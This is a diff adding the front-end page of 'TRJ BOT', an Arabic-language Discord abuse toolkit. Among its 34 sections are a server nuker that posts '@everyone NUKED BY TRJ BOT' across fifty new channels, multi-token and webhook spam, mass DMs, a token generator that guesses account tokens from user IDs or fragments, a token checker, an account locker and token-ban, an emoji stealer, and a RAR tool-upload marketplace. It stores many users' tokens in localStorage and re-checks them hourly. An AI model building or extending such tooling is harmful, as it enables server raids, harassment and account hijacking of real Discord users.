@@ -1,0 +1,2290 @@
+'use client'
+
+import { useState, useEffect, useCallback, useRef } from 'react'
+
+type Section = 'verify' | 'nuker' | 'copy' | 'spam' | 'leveling' | 'sniper' | 'checker' | 'multi-spam' | 'mass-dm' | 'leaver' | 'react' | 'webhook-spam' | 'voice-online' | 'server-info' | 'channel-clear' | 'token-generator' | 'webhook-creator' | 'server-backup' | 'locker' | 'avatar' | 'banner' | 'hypesquad' | 'disconnect' | 'create-server' | 'join-server' | 'delete-server' | 'change-bio' | 'token-info' | 'webhook-sender' | 'roles-manager' | 'nickname-changer' | 'emoji-stealer' | 'token-ban' | 'token-save' | 'tool' | 'profile'
+
+interface Stats {
+  deleted?: number; created?: number; spam_sent?: number; banned?: number; roles?: number
+  txt?: number; voice?: number; cats?: number; sent?: number; failed?: number
+  blocked?: number; left?: number; total?: number; emojis?: number; permissions?: number; kicked?: number
+}
+
+interface Result { username: string; status: string; color: string; debug?: string; method?: string }
+interface VerifyInfo { type: string; name: string; id: string; email?: string; nitro?: string; verified?: string; createdAt?: string; flags?: number }
+interface TokenCheckResult { token: string; valid: boolean; type: string; name: string; id: string; email?: string; nitro?: string; verified?: string; createdAt?: string; phone?: string; mfa?: string; error?: string }
+interface GuildInfo { id: string; name: string; owner: boolean; members: number }
+
+export default function Home() {
+  const [section, setSection] = useState<Section>('verify')
+  const [loading, setLoading] = useState(false)
+  const [result, setResult] = useState('')
+  const [stats, setStats] = useState<Stats | null>(null)
+  const [verifyData, setVerifyData] = useState<VerifyInfo | null>(null)
+  const [sniperResults, setSniperResults] = useState<Result[]>([])
+  const [checkerResults, setCheckerResults] = useState<TokenCheckResult[]>([])
+  const [checkerStats, setCheckerStats] = useState<{ total: number; valid: number; invalid: number; bots: number; users: number; nitro: number } | null>(null)
+  const [progress, setProgress] = useState('')
+  const [guildList, setGuildList] = useState<GuildInfo[]>([])
+  const [extraData, setExtraData] = useState<any>(null)
+
+  const [verifyToken, setVerifyToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_verify_token') || '' })
+  const [nukerToken, setNukerToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_nuker_token') || '' })
+  const [copyToken, setCopyToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_copy_token') || '' })
+  const [spamToken, setSpamToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_spam_token') || '' })
+  const [levelingToken, setLevelingToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_leveling_token') || '' })
+  const [sniperToken, setSniperToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_sniper_token') || '' })
+  const [checkerTokens, setCheckerTokens] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_checker_tokens') || '' })
+  const [multiSpamTokens, setMultiSpamTokens] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_multi_tokens') || '' })
+  const [massDmToken, setMassDmToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_dm_token') || '' })
+  const [leaverToken, setLeaverToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_leaver_token') || '' })
+  const [reactToken, setReactToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_react_token') || '' })
+  const [whSpamToken, setWhSpamToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_whspam_token') || '' })
+
+  const [guildId, setGuildId] = useState('')
+  const [nukeMsg, setNukeMsg] = useState('@everyone NUKED BY TRJ BOT 💀🔥')
+  const [nukeChannelName, setNukeChannelName] = useState('nuked-by-trj')
+  const [nukeChannelCount, setNukeChannelCount] = useState(50)
+  const [nukeMsgPerChannel, setNukeMsgPerChannel] = useState(50)
+  const [nukeRenameCh, setNukeRenameCh] = useState('nuked')
+  const [nukeSlowmode, setNukeSlowmode] = useState(0)
+
+  const [sourceId, setSourceId] = useState('')
+  const [targetId, setTargetId] = useState('')
+  const [copyOptions, setCopyOptions] = useState({ roles: true, channels: true, settings: true })
+
+  const [channelId, setChannelId] = useState('')
+  const [messages, setMessages] = useState('')
+  const [duration, setDuration] = useState(60)
+  const [speed, setSpeed] = useState(0.3)
+
+  const [levelingChannelId, setLevelingChannelId] = useState('')
+  const [levelingDuration, setLevelingDuration] = useState(300)
+  const [levelingSpeed, setLevelingSpeed] = useState(0.8)
+
+  const [sniperMode, setSniperMode] = useState<'auto' | 'manual'>('auto')
+  const [usernames, setUsernames] = useState('')
+  const [sniperCount, setSniperCount] = useState(10)
+  const [sniperLength, setSniperLength] = useState(4)
+  const [useDot, setUseDot] = useState(false)
+  const [useUnderscore, setUseUnderscore] = useState(false)
+  // sniperPassword removed - not needed
+  const [sniperAccountInfo, setSniperAccountInfo] = useState<any>(null)
+  const [sniperStats, setSniperStats] = useState<any>(null)
+  const [availableNames, setAvailableNames] = useState<string[]>([])
+  const [sniperPattern, setSniperPattern] = useState('random')
+
+  // Multi-Spam
+  const [msChannelId, setMsChannelId] = useState('')
+  const [msMessages, setMsMessages] = useState('')
+  const [msDuration, setMsDuration] = useState(60)
+  const [msSpeed, setMsSpeed] = useState(0.3)
+
+  // Mass DM
+  const [dmGuildId, setDmGuildId] = useState('')
+  const [dmMessage, setDmMessage] = useState('')
+  const [dmMaxMembers, setDmMaxMembers] = useState(100)
+
+  // React
+  const [reactChannelId, setReactChannelId] = useState('')
+  const [reactEmoji, setReactEmoji] = useState('👍 ❤️ 🔥 🎉 💯')
+  const [reactMessageId, setReactMessageId] = useState('')
+  const [reactMode, setReactMode] = useState<'manual' | 'auto'>('manual')
+  const [reactDuration, setReactDuration] = useState(60)
+
+  // Webhook Spam
+  const [whSpamUrl, setWhSpamUrl] = useState('')
+  const [whSpamMessage, setWhSpamMessage] = useState('')
+  const [whSpamCount, setWhSpamCount] = useState(50)
+  const [whSpamUsername, setWhSpamUsername] = useState('')
+  // Voice Online
+  const [voiceToken, setVoiceToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_voice_token') || '' })
+  const [voiceGuildId, setVoiceGuildId] = useState('')
+  const [voiceChannelId, setVoiceChannelId] = useState('')
+  const [voiceDuration, setVoiceDuration] = useState(86400)
+  const [voiceActive, setVoiceActive] = useState(false)
+  const [voiceSessionCount, setVoiceSessionCount] = useState(0)
+  const [voiceRemaining, setVoiceRemaining] = useState('')
+  const [showTokenGuide, setShowTokenGuide] = useState(false)
+  const [showProfile, setShowProfile] = useState(false)
+  const [landingView, setLandingView] = useState<'landing' | 'app' | 'tool'>('landing')
+  const voiceTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
+  const voiceCountdownRef = useRef<ReturnType<typeof setInterval> | null>(null)
+  // Account Locker
+  const [lockerToken, setLockerToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_locker_token') || '' })
+  const [lockerLogs, setLockerLogs] = useState<string[]>([])
+  const [lockerLoading, setLockerLoading] = useState(false)
+  // Server Info
+  const [serverInfoToken, setServerInfoToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_serverinfo_token') || '' })
+  const [serverInfoGuildId, setServerInfoGuildId] = useState('')
+  // Channel Clear
+  const [clearToken, setClearToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_clear_token') || '' })
+  const [clearChannelId, setClearChannelId] = useState('')
+  const [clearCount, setClearCount] = useState(100)
+  // Token Generator
+  const [tgMode, setTgMode] = useState<'random' | 'userid' | 'fragment'>('random')
+  const [tgCount, setTgCount] = useState(10)
+  const [tgUserId, setTgUserId] = useState('')
+  const [tgHalfToken, setTgHalfToken] = useState('')
+  const [tgFragment, setTgFragment] = useState('')
+  const [tgFragmentAnalysis, setTgFragmentAnalysis] = useState<{hasPart1: boolean; hasPart2: boolean; hasPart3: boolean; partialPart1: boolean; partialPart2: boolean; partialPart3: boolean; part1: string; part2: string; part3: string; missingParts: string[]; analysis: string; detail: string; userIDs: string[]; timestamps: string[]; confidence: number} | null>(null)
+  const [tgResults, setTgResults] = useState<{token: string; valid: boolean; info?: string; error?: string; index?: number; strategy?: number; size?: number; entropy?: number; isDemo?: boolean}[]>([])
+  const [tgRunning, setTgRunning] = useState(false)
+  const [tgStats, setTgStats] = useState<{total: number; checked: number; valid: number; invalid: number; skipped: number; speed: string} | null>(null)
+  const tgAbortRef = useRef<AbortController | null>(null)
+  // Webhook Creator - محسّن v2
+  const [whCreateToken, setWhCreateToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_whcreate_token') || '' })
+  const [whCreateGuildId, setWhCreateGuildId] = useState('')
+  const [whCreateCount, setWhCreateCount] = useState(1)
+  const [whCreateName, setWhCreateName] = useState('TRJ Webhook')
+  const [whCreateResults, setWhCreateResults] = useState<{url: string; name: string; id: string; channelId?: string; channelName?: string}[]>([])
+  const [whChannels, setWhChannels] = useState<{id: string; name: string; type: number; position: number}[]>([])
+  const [whSelectedChannels, setWhSelectedChannels] = useState<string[]>([])
+  const [whCreateMode, setWhCreateMode] = useState<'create' | 'spam' | 'existing'>('create')
+  const [whCrSpamMessage, setWhCrSpamMessage] = useState('@everyone TRJ BOT')
+  const [whCrSpamCount, setWhCrSpamCount] = useState(10)
+  const [whCrSpamUsername, setWhCrSpamUsername] = useState('')
+  const [whCrSpamAvatarUrl, setWhCrSpamAvatarUrl] = useState('')
+  const [whEmbedEnabled, setWhEmbedEnabled] = useState(false)
+  const [whEmbedTitle, setWhEmbedTitle] = useState('')
+  const [whEmbedDesc, setWhEmbedDesc] = useState('')
+  const [whEmbedColor, setWhEmbedColor] = useState('5865F2')
+  const [whExistingUrls, setWhExistingUrls] = useState('')
+  // Server Backup
+  const [backupToken, setBackupToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_backup_token') || '' })
+  const [backupGuildId, setBackupGuildId] = useState('')
+  const [restoreData, setRestoreData] = useState('')
+  // Change Avatar
+  const [avatarToken, setAvatarToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_avatar_token') || '' })
+  const [avatarUrl, setAvatarUrl] = useState('')
+  // Change Banner
+  const [bannerToken, setBannerToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_banner_token') || '' })
+  const [bannerUrl, setBannerUrl] = useState('')
+  // HypeSquad
+  const [hypeToken, setHypeToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_hype_token') || '' })
+  const [hypeHouse, setHypeHouse] = useState(1)
+  // Create Server
+  const [createSrvToken, setCreateSrvToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_createsrv_token') || '' })
+  const [createSrvName, setCreateSrvName] = useState('TRJ Server')
+  const [createSrvIcon, setCreateSrvIcon] = useState('')
+  // Change Bio
+  const [bioToken, setBioToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_bio_token') || '' })
+  const [bioText, setBioText] = useState('')
+  // Delete Server
+  const [deleteSrvToken, setDeleteSrvToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_deletesrv_token') || '' })
+  const [deleteSrvId, setDeleteSrvId] = useState('')
+  // Disconnect
+  const [disconnectToken, setDisconnectToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_disconnect_token') || '' })
+  // Join Server
+  const [joinSrvToken, setJoinSrvToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_join_token') || '' })
+  const [joinInviteCode, setJoinInviteCode] = useState('')
+  // Token Info
+  const [tiToken, setTiToken] = useState('')
+  const [tiResult, setTiResult] = useState<any>(null)
+  // Webhook Sender
+  const [wsUrl, setWsUrl] = useState('')
+  const [wsMessage, setWsMessage] = useState('')
+  const [wsUsername, setWsUsername] = useState('TRJ BOT')
+  const [wsAvatarUrl, setWsAvatarUrl] = useState('')
+  const [wsEmbedTitle, setWsEmbedTitle] = useState('')
+  const [wsEmbedDesc, setWsEmbedDesc] = useState('')
+  const [wsEmbedColor, setWsEmbedColor] = useState('5865F2')
+  const [wsEmbedEnabled, setWsEmbedEnabled] = useState(false)
+  // Roles Manager
+  const [rmToken, setRmToken] = useState('')
+  const [rmGuildId, setRmGuildId] = useState('')
+  const [rmRoleId, setRmRoleId] = useState('')
+  // Nickname Changer
+  const [ncToken, setNcToken] = useState('')
+  const [ncGuildId, setNcGuildId] = useState('')
+  const [ncNickname, setNcNickname] = useState('')
+  // Emoji Stealer
+  const [esToken, setEsToken] = useState('')
+  const [esSourceGuild, setEsSourceGuild] = useState('')
+  const [esTargetGuild, setEsTargetGuild] = useState('')
+  // Token Ban
+  const [tbUserToken, setTbUserToken] = useState('')
+  const [tbBotToken, setTbBotToken] = useState('')
+  // Tool - Upload & Share Tools
+  interface ToolEntry {
+    id: string
+    name: string
+    description: string
+    fileName: string
+    fileSize: string
+    fileData: string
+    fileType: string
+    category: string
+    author: string
+    downloads: number
+    createdAt: string
+  }
+  const [tools, setTools] = useState<ToolEntry[]>(() => { if (typeof window === 'undefined') return []; try { const s = localStorage.getItem('trj_tools_meta'); const m = s ? JSON.parse(s) : []; return m } catch { return [] } })
+  const [newToolName, setNewToolName] = useState('')
+  const [newToolDesc, setNewToolDesc] = useState('')
+  const [newToolCategory, setNewToolCategory] = useState('أدوات')
+  const [newToolAuthor, setNewToolAuthor] = useState('')
+  const [newToolFile, setNewToolFile] = useState<File | null>(null)
+  useEffect(() => { if (typeof window === 'undefined') return; try { const meta = tools.map(t => ({ ...t, fileData: '' })); localStorage.setItem('trj_tools_meta', JSON.stringify(meta)); localStorage.removeItem('trj_tools') } catch { /* localStorage quota exceeded - clear old data */ try { localStorage.removeItem('trj_tools'); localStorage.removeItem('trj_tools_meta') } catch {} } }, [tools])
+  // Token Save - Multi Token System
+  interface SavedTokenEntry { id: string; token: string; name: string; type: string; email?: string; nitro?: string; status: 'checking' | 'valid' | 'invalid' | 'changed'; addedAt: string; lastChecked: string; prevName?: string }
+  const [savedTokens, setSavedTokens] = useState<SavedTokenEntry[]>(() => { if (typeof window === 'undefined') return []; try { const s = localStorage.getItem('trj_saved_tokens_arr'); return s ? JSON.parse(s) : [] } catch { return [] } })
+  const [newTokenInput, setNewTokenInput] = useState('')
+  const [tsCheckingAll, setTsCheckingAll] = useState(false)
+  const tsAutoCheckRef = useRef<ReturnType<typeof setInterval> | null>(null)
+  const savedTokensRef = useRef(savedTokens)
+  savedTokensRef.current = savedTokens
+  // حفظ التوكنات في localStorage
+  useEffect(() => { if (typeof window === 'undefined') return; try { localStorage.setItem('trj_saved_tokens_arr', JSON.stringify(savedTokens)) } catch {} }, [savedTokens])
+  // فحص تلقائي كل ساعة
+  useEffect(() => {
+    if (tsAutoCheckRef.current) clearInterval(tsAutoCheckRef.current)
+    if (savedTokens.length > 0) {
+      tsAutoCheckRef.current = setInterval(async () => {
+        const tokens = [...savedTokensRef.current]
+        for (const t of tokens) {
+          setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'checking' as const } : st))
+          try {
+            const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t.token }) })
+            const data = await res.json()
+            setSavedTokens(prev => prev.map(st => {
+              if (st.id !== t.id) return st
+              if (data.success) {
+                if (t.name && t.name !== data.name) return { ...st, name: data.name, status: 'changed' as const, lastChecked: new Date().toLocaleTimeString('ar-SA'), prevName: t.name }
+                return { ...st, name: data.name, status: 'valid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
+              }
+              return { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
+            }))
+          } catch { setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') } : st)) }
+          await new Promise(r => setTimeout(r, 1500))
+        }
+      }, 3600000)
+    }
+    return () => { if (tsAutoCheckRef.current) clearInterval(tsAutoCheckRef.current) }
+  }, [savedTokens.length])
+
+  // Save to localStorage (safe wrapper)
+  const safeSet = (k: string, v: string) => { try { localStorage.setItem(k, v) } catch {} }
+  useEffect(() => { if (verifyToken) safeSet('trj_verify_token', verifyToken) }, [verifyToken])
+  useEffect(() => { if (nukerToken) safeSet('trj_nuker_token', nukerToken) }, [nukerToken])
+  useEffect(() => { if (copyToken) safeSet('trj_copy_token', copyToken) }, [copyToken])
+  useEffect(() => { if (spamToken) safeSet('trj_spam_token', spamToken) }, [spamToken])
+  useEffect(() => { if (levelingToken) safeSet('trj_leveling_token', levelingToken) }, [levelingToken])
+  useEffect(() => { if (sniperToken) safeSet('trj_sniper_token', sniperToken) }, [sniperToken])
+  useEffect(() => { if (checkerTokens) safeSet('trj_checker_tokens', checkerTokens) }, [checkerTokens])
+  useEffect(() => { if (multiSpamTokens) safeSet('trj_multi_tokens', multiSpamTokens) }, [multiSpamTokens])
+  useEffect(() => { if (massDmToken) safeSet('trj_dm_token', massDmToken) }, [massDmToken])
+  useEffect(() => { if (leaverToken) safeSet('trj_leaver_token', leaverToken) }, [leaverToken])
+  useEffect(() => { if (reactToken) safeSet('trj_react_token', reactToken) }, [reactToken])
+  useEffect(() => { if (whSpamToken) safeSet('trj_whspam_token', whSpamToken) }, [whSpamToken])
+  useEffect(() => { if (voiceToken) safeSet('trj_voice_token', voiceToken) }, [voiceToken])
+  useEffect(() => { if (lockerToken) safeSet('trj_locker_token', lockerToken) }, [lockerToken])
+  useEffect(() => { if (serverInfoToken) safeSet('trj_serverinfo_token', serverInfoToken) }, [serverInfoToken])
+  useEffect(() => { if (clearToken) safeSet('trj_clear_token', clearToken) }, [clearToken])
+  useEffect(() => { if (whCreateToken) safeSet('trj_whcreate_token', whCreateToken) }, [whCreateToken])
+  useEffect(() => { if (backupToken) safeSet('trj_backup_token', backupToken) }, [backupToken])
+  useEffect(() => { if (avatarToken) safeSet('trj_avatar_token', avatarToken) }, [avatarToken])
+  useEffect(() => { if (bannerToken) safeSet('trj_banner_token', bannerToken) }, [bannerToken])
+  useEffect(() => { if (hypeToken) safeSet('trj_hype_token', hypeToken) }, [hypeToken])
+  useEffect(() => { if (createSrvToken) safeSet('trj_createsrv_token', createSrvToken) }, [createSrvToken])
+  useEffect(() => { if (bioToken) safeSet('trj_bio_token', bioToken) }, [bioToken])
+  useEffect(() => { if (deleteSrvToken) safeSet('trj_deletesrv_token', deleteSrvToken) }, [deleteSrvToken])
+  useEffect(() => { if (disconnectToken) safeSet('trj_disconnect_token', disconnectToken) }, [disconnectToken])
+  useEffect(() => { if (joinSrvToken) safeSet('trj_join_token', joinSrvToken) }, [joinSrvToken])
+
+  const genUsername = () => {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+    const special = (useDot ? '.' : '') + (useUnderscore ? '_' : '')
+    const allChars = chars + special
+    if (sniperPattern === 'consonants') { const cons = 'bcdfghjklmnpqrstvwxyz'; let u = cons[Math.floor(Math.random() * cons.length)]; for (let i = 1; i < sniperLength; i++) u += allChars[Math.floor(Math.random() * allChars.length)]; return u }
+    if (sniperPattern === 'numbers') { let u = chars[Math.floor(Math.random() * 26)]; for (let i = 1; i < sniperLength; i++) u += chars[Math.floor(Math.random() * chars.length)]; return u }
+    if (sniperPattern === 'dictionary') { const words = ['the','new','old','big','one','two','red','sun','sky','ice','fire','dark','cool','fast','top','zen','neo','pro','vex','lux','arc','sol','nox','pyx','zex','kai','ray','fox','owl','gem']; return words[Math.floor(Math.random() * words.length)] + String(Math.floor(Math.random() * 999)).padStart(3, '0') }
+    if (sniperPattern === 'rare') { const p = [() => { const c = chars[Math.floor(Math.random()*26)]; return c+c+String(Math.floor(Math.random()*9999)).padStart(4,'0') }, () => { const c = chars[Math.floor(Math.random()*26)]; return c+String(Math.floor(Math.random()*99))+c+String(Math.floor(Math.random()*99)) }]; return p[Math.floor(Math.random()*p.length)]() }
+    let u = chars[Math.floor(Math.random() * 26)]; for (let i = 1; i < sniperLength; i++) u += allChars[Math.floor(Math.random() * allChars.length)]; return u
+  }
+
+  const stopTgGeneration = useCallback(() => {
+    if (tgAbortRef.current) { tgAbortRef.current.abort(); tgAbortRef.current = null }
+    setTgRunning(false); setProgress('')
+  }, [])
+
+  const stopVoiceAnchor = useCallback(() => {
+    if (voiceTimerRef.current) { clearInterval(voiceTimerRef.current); voiceTimerRef.current = null }
+    if (voiceCountdownRef.current) { clearInterval(voiceCountdownRef.current); voiceCountdownRef.current = null }
+    setVoiceActive(false); setVoiceSessionCount(0); setVoiceRemaining('')
+  }, [])
+
+  const clearState = useCallback(() => { stopTgGeneration(); stopVoiceAnchor(); setResult(''); setStats(null); setVerifyData(null); setSniperResults([]); setSniperAccountInfo(null); setSniperStats(null); setAvailableNames([]); setCheckerResults([]); setCheckerStats(null); setProgress(''); setGuildList([]); setExtraData(null); setTgResults([]); setTgHalfToken(''); setTgStats(null); setWhCreateResults([]); setWhChannels([]); setWhSelectedChannels([]); setTgFragment(''); setTgFragmentAnalysis(null) }, [stopTgGeneration, stopVoiceAnchor])
+
+  // timeout مخصص حسب الـ endpoint: voice-online=30ث (يرجع فوراً), copy=5دق, nuker=5دق, الباقي=3دق
+  const getTimeout = (ep: string) => {
+    if (ep === 'voice-online') return 30000   // 30 ثانية
+    if (ep === 'copy' || ep === 'nuker' || ep === 'server-backup') return 300000 // 5 دقائق
+    return 180000 // 3 دقائق كافي للباقي
+  }
+
+  const api = async (endpoint: string, body: any, overrideTimeout?: number) => {
+    setLoading(true); setResult(''); setStats(null); setSniperResults([]); setSniperAccountInfo(null); setSniperStats(null); setAvailableNames([]); setCheckerResults([]); setCheckerStats(null); setProgress('جاري التنفيذ...'); setGuildList([]); setExtraData(null)
+    try {
+      const payload = { ...body }
+      const controller = new AbortController()
+      const timeoutMs = overrideTimeout || getTimeout(endpoint)
+      const timeoutId = setTimeout(() => controller.abort(), timeoutMs)
+      const res = await fetch(`/api/${endpoint}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), signal: controller.signal })
+      clearTimeout(timeoutId)
+      const data = await res.json()
+      if (data.success) {
+        setResult('✅ تم بنجاح!')
+        if (endpoint === 'sniper') { setSniperResults(data.results); if (data.stats) setSniperStats(data.stats); if (data.availableNames) setAvailableNames(data.availableNames); if (data.accountInfo) setSniperAccountInfo(data.accountInfo) }
+        else if (endpoint === 'token-checker') { setCheckerResults(data.results); if (data.stats) setCheckerStats(data.stats) }
+        else if (endpoint === 'leaver' && data.guilds) { setGuildList(data.guilds) }
+        else if (endpoint === 'leaver' && data.servers) { setGuildList(data.servers.map((s: any) => ({ id: s.id, name: s.name, owner: s.name?.includes('owner'), members: 0 }))) }
+        else if (endpoint === 'multi-spam' && data.stats?.tokenStats) { setExtraData(data.stats.tokenStats) }
+
+        if (data.stats) setStats(data.stats)
+        setLoading(false); setProgress(''); return data
+      } else { setResult(`❌ ${data.error}`); setLoading(false); setProgress(''); return null }
+    } catch (e) { 
+      if (e instanceof Error && e.name === 'AbortError') setResult('❌ انتهى وقت الانتظار - حاول عدد أقل')
+      else setResult('❌ خطأ في الاتصال')
+      setLoading(false); setProgress(''); return null 
+    }
+  }
+
+  const sections = [
+    { id: 'verify' as Section, name: 'تحقق', icon: '🔑' },
+    { id: 'nuker' as Section, name: 'نيوكر', icon: '💥' },
+    { id: 'copy' as Section, name: 'نسخ', icon: '📋' },
+    { id: 'spam' as Section, name: 'تسطير', icon: '⚡' },
+    { id: 'leveling' as Section, name: 'تلفيل', icon: '📈' },
+    { id: 'sniper' as Section, name: 'صيد', icon: '🎯' },
+    { id: 'multi-spam' as Section, name: 'سبام متعدد', icon: '🔥' },
+    { id: 'mass-dm' as Section, name: 'DM جماعي', icon: '📧' },
+    { id: 'leaver' as Section, name: 'مغادرة', icon: '🚪' },
+    { id: 'react' as Section, name: 'رياكشن', icon: '🎭' },
+    { id: 'checker' as Section, name: 'فحص توكنات', icon: '🔍' },
+    { id: 'webhook-spam' as Section, name: 'ويب هوك سبام', icon: '🔗' },
+    { id: 'voice-online' as Section, name: 'تثبيت فويس', icon: '🎤' },
+    { id: 'server-info' as Section, name: 'معلومات سيرفر', icon: '📊' },
+    { id: 'channel-clear' as Section, name: 'مسح رسائل', icon: '🧹' },
+    { id: 'token-generator' as Section, name: 'توليد توكنات', icon: '🎰' },
+    { id: 'webhook-creator' as Section, name: 'إنشاء ويب هوك', icon: '🔗' },
+    { id: 'server-backup' as Section, name: 'حفظ سيرفر', icon: '💾' },
+    { id: 'locker' as Section, name: 'قفل حساب', icon: '🔒' },
+    { id: 'avatar' as Section, name: 'تغيير أفتار', icon: '🖼️' },
+    { id: 'banner' as Section, name: 'تغيير بانر', icon: '🌈' },
+    { id: 'hypesquad' as Section, name: 'هايب سكواد', icon: '🎮' },
+    { id: 'disconnect' as Section, name: 'قطع اتصال', icon: '🔌' },
+    { id: 'create-server' as Section, name: 'إنشاء سيرفر', icon: '➕' },
+    { id: 'join-server' as Section, name: 'دخول سيرفر', icon: '🏠' },
+    { id: 'delete-server' as Section, name: 'حذف سيرفر', icon: '🗑️' },
+    { id: 'change-bio' as Section, name: 'تغيير بايو', icon: '📝' },
+    { id: 'token-info' as Section, name: 'معلومات توكن', icon: '🔍' },
+    { id: 'webhook-sender' as Section, name: 'إرسال ويب هوك', icon: '📨' },
+    { id: 'roles-manager' as Section, name: 'إدارة رتب', icon: '🛡️' },
+    { id: 'nickname-changer' as Section, name: 'تغيير نك', icon: '✏️' },
+    { id: 'emoji-stealer' as Section, name: 'سرقة إيموجي', icon: '😀' },
+    { id: 'token-ban' as Section, name: 'تبنيد حساب', icon: '🚫' },
+    { id: 'token-save' as Section, name: 'حفظ توكن', icon: '💾' },
+    { id: 'profile' as Section, name: 'البروفايل', icon: '👤' },
+  ]
+
+  return (
+    <div className="min-h-screen relative">
+      <div className="bg-animated"><div className="bg-mesh" /><div className="bg-noise" /><div className="bg-grid" /><div className="bg-orb bg-orb-1" /><div className="bg-orb bg-orb-2" /><div className="bg-orb bg-orb-3" /><div className="bg-lines"><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /></div><div className="bg-scanline" /></div>
+
+      {/* ===== LANDING PAGE ===== */}
+      {landingView === 'landing' && (
+        <div className="min-h-screen flex items-center justify-center relative z-10 p-4">
+          <div className="animate-fade-in text-center max-w-lg w-full">
+            <div className="mb-8">
+              <div className="text-6xl mb-4">🛡️</div>
+              <h1 className="text-4xl font-black text-gradient-green mb-2">TRJ BOT</h1>
+              <p className="text-slate-400 text-sm">أداة متكاملة لديسكورد - 34 ميزة</p>
+              <span className="text-[10px] text-emerald-400/60 bg-emerald-500/8 px-3 py-1 rounded-full border border-emerald-500/15 inline-block mt-2 font-medium">v4.3</span>
+            </div>
+
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
+              {/* Option 1: Start */}
+              <div onClick={() => setLandingView('app')} className="landing-card landing-card-green text-center group">
+                <div className="text-5xl mb-4 group-hover:scale-110 transition-transform">⚡</div>
+                <h2 className="text-xl font-black text-emerald-400 mb-2">ابدأ</h2>
+                <p className="text-slate-400 text-xs leading-relaxed">استخدم جميع الأدوات المتاحة — نيوكر، نسخ، سبام، صيد، فحص توكنات والمزيد</p>
+                <div className="mt-4 text-[10px] text-emerald-400/50 bg-emerald-500/8 px-3 py-1.5 rounded-full border border-emerald-500/15 inline-block">34 ميزة جاهزة</div>
+              </div>
+
+              {/* Option 2: Tool */}
+              <div onClick={() => setLandingView('tool')} className="landing-card landing-card-purple text-center group">
+                <div className="text-5xl mb-4 group-hover:scale-110 transition-transform">🔧</div>
+                <h2 className="text-xl font-black text-purple-400 mb-2">Tool</h2>
+                <p className="text-slate-400 text-xs leading-relaxed">ارفع أدواتك وشاركها — ارفع ملفات RAR وابدأ بنشر أدواتك للمستخدمين</p>
+                <div className="mt-4 text-[10px] text-purple-400/50 bg-purple-500/8 px-3 py-1.5 rounded-full border border-purple-500/15 inline-block">مجتمع الأدوات</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ===== TOOL MARKETPLACE ===== */}
+      {landingView === 'tool' && (
+        <div className="min-h-screen relative z-10">
+          {/* Tool Header */}
+          <header className="header-modern sticky top-0 z-50 px-4 py-3">
+            <div className="max-w-4xl mx-auto flex items-center justify-between">
+              <button onClick={() => setLandingView('landing')} className="flex items-center gap-2 text-slate-400 hover:text-emerald-400 transition-colors cursor-pointer">
+                <span className="text-lg">→</span>
+                <span className="text-sm font-medium">رجوع</span>
+              </button>
+              <div className="flex items-center gap-2">
+                <span className="text-2xl">🔧</span>
+                <span className="text-lg font-black text-gradient-purple">Tool</span>
+                <span className="text-[10px] text-purple-400/60 bg-purple-500/8 px-2 py-0.5 rounded-full border border-purple-500/15 font-medium">{tools.length} أداة</span>
+              </div>
+              <div />
+            </div>
+          </header>
+
+          <main className="max-w-4xl mx-auto p-4 pb-8">
+            {/* Upload Form */}
+            <div className="glass-card rounded-2xl p-6 border border-purple-500/15 mb-6 animate-fade-in">
+              <div className="flex items-center gap-3 mb-4">
+                <span className="text-2xl">📤</span>
+                <h2 className="text-lg font-black text-purple-400">رفع أداة جديدة</h2>
+              </div>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-3">
+                <div>
+                  <label className="text-[11px] text-white/50 mb-1 block">اسم الأداة</label>
